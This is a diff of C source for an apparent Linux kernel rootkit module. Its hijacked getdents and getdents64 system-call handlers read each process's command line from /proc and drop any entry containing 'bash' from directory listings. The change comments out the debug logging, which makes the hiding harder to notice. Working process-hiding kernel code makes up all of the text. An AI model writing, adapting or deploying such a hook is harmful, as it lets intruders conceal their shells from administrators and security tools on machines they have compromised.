@@ -114,14 +114,14 @@ asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 	if (strcmp(path, "/proc") == 0) {
 		isproc = true;
 	}
-	printk(KERN_DEBUG "isproc value: %s\n %s\n", isproc? "true" : "false", path);
-	printk(KERN_INFO "hijacked call.\n");
-	printk(KERN_INFO "num reads: %d\n",num_reads);
+//	printk(KERN_DEBUG "isproc value: %s\n %s\n", isproc? "true" : "false", path);
+//	printk(KERN_INFO "hijacked call.\n");
+//	printk(KERN_INFO "num reads: %d\n",num_reads);
 
 	for (i = 0; i < num_reads; i+= cdirp->d_reclen){
 		cdirp = (struct linux_dirent*)(start_offset + i);
-		printk(KERN_INFO "d_ino:%lu, d_reclen:%u, d_off:%lu, d_name: %s \n",
-		       cdirp->d_ino, cdirp->d_reclen, cdirp->d_off, cdirp->d_name);
+//		printk(KERN_INFO "d_ino:%lu, d_reclen:%u, d_off:%lu, d_name: %s \n",
+//		       cdirp->d_ino, cdirp->d_reclen, cdirp->d_off, cdirp->d_name);
 		if(isproc && isnumber(cdirp->d_name)){
 			strcpy(kbuf, "/proc/");
 			strcat(kbuf, cdirp->d_name);
@@ -129,10 +129,10 @@ asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 			fcmdline = filp_open(kbuf, O_RDONLY, 0);
 			readnums = kernel_read(fcmdline, 0, kbuf2, PAGE_SIZE);
 			filp_close(fcmdline, NULL);
-			if (readnums != 0)
-				printk("process cmdline %s\n", kbuf2);
+//			if (readnums != 0)
+//				printk("process cmdline %s\n", kbuf2);
 			if (readnums != 0 && strstr(kbuf2, "bash") != NULL) {
-				printk("File to hide %s\n", kbuf2);
+//				printk("File to hide %s\n", kbuf2);
 				pdirp->d_reclen += cdirp->d_reclen;
 			} else {
 				pdirp = cdirp;
@@ -162,8 +162,8 @@ asmlinkage int hijacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	int i;
 	long start_offset = (long)dirp;
 	
-	printk(KERN_INFO "hijacked call.\n");
-	printk(KERN_INFO "num reads: %d\n",num_reads);
+//	printk(KERN_INFO "hijacked call.\n");
+//	printk(KERN_INFO "num reads: %d\n",num_reads);
 
 	for (i = 0; i < num_reads; i+= cdirp->d_reclen){
 		cdirp = (struct linux_dirent64*)(start_offset + i);
